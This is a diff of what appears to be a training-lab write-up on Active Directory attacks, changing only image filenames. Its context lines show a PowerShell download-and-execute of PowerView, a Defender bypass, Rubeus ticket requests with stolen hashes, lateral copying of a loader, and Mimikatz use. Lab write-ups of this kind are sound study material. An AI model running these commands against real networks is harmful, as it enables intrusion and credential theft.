@@ -22,7 +22,7 @@ Then we had a tip from a guy on discord to host a web server using WSL rather th
 
 We then download power View on the target machine and launch the following command: Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.13:6565/PowerView.ps1'))
@@ -178,11 +178,11 @@ Here we see that the command was succesful:
 
 So we just have to run the file and collect our hashes:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So now we can ask for a tgt with rubeus, on local machine open a elevated cmd and set those values to bypass defender:
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we ask for a tgt with the new hashes we got:
 
@@ -192,7 +192,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:srvadmin /
 
 Then a shell will spawn with srvadmin privileges, we just have to check if srvadmin has admin privileges on any other machine:
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So we can see we have local admin on dcorp-mgmt and dcorp-adminsrv
 
@@ -203,7 +203,7 @@ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 echo F | xcopy C:\AD\Tools\Safety.bat \\dcorp-mgmt\C$\Users\Public\Safety.bat
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We now need to run Invoke-mimi on dcorp-mgmt
 
